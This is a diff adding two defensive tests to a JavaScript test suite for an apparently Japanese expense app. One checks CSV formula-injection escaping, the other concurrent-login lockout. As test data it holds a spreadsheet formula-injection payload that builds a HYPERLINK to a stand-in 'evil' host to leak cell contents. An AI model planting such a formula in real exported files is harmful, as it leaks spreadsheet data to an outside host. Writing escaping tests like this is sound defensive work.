@@ -83,6 +83,17 @@ async function main() {
     assert.equal(r.registeredBy, null);
     assert.equal(r.registeredById, null);
   });
+  await test('数式に見える値はExcelで数式にならないよう先頭に \' を付け、読み戻すと元の値', () => {
+    const evil = '=HYPERLINK("http://evil/?"&A1,"x")';
+    const csv = toCsv([record({ companyName: evil, registeredBy: '+田中', category: '@会議費' })]);
+    assert.ok(!csv.includes(',=HYPERLINK') && !csv.includes('"=HYPERLINK'));
+    assert.ok(csv.includes(`"'=HYPERLINK`));
+    const [r] = fromCsv(csv);
+    assert.equal(r.companyName, evil);
+    assert.equal(r.registeredBy, '+田中');
+    assert.equal(r.category, '@会議費');
+    assert.equal(r.totalAmount, 800);
+  });
   await test('Excelで列を並べ替えても登録者IDを読める', () => {
     const csv = 'ID,登録者ID,金額,登録者\r\nf2,stf2,500,佐藤\r\n';
     const [r] = fromCsv(csv);
@@ -124,6 +135,14 @@ async function main() {
         assert.deepEqual(r, { ok: false, reason: 'locked' });
         const s = await prisma.staff.findUniqueOrThrow({ where: { id: staff.id } });
         assert.ok(s.lockedUntil && s.lockedUntil.getTime() - Date.now() > 14 * 60_000);
+      });
+      await test('同時に大量に試しても、照合まで進むのは10回分まで・その後は正しいパスワードでも停止', async () => {
+        await prisma.staff.update({ where: { id: staff.id }, data: { lockedUntil: null, failedLoginCount: 0 } });
+        const results = await Promise.all(Array.from({ length: 40 }, (_, i) => authenticateStaff(staff.loginId, `bad-${i}`)));
+        const checked = results.filter((r) => !r.ok && r.reason === 'invalid').length;
+        assert.ok(checked <= 9, `照合して「違う」と返したのが${checked}件`);
+        assert.equal(results.filter((r) => r.ok).length, 0);
+        assert.deepEqual(await authenticateStaff(staff.loginId, 'password-1'), { ok: false, reason: 'locked' });
       });
       await test('停止時刻を過ぎれば、またログインできる', async () => {
         await prisma.staff.update({ where: { id: staff.id }, data: { lockedUntil: new Date(Date.now() - 1000) } });
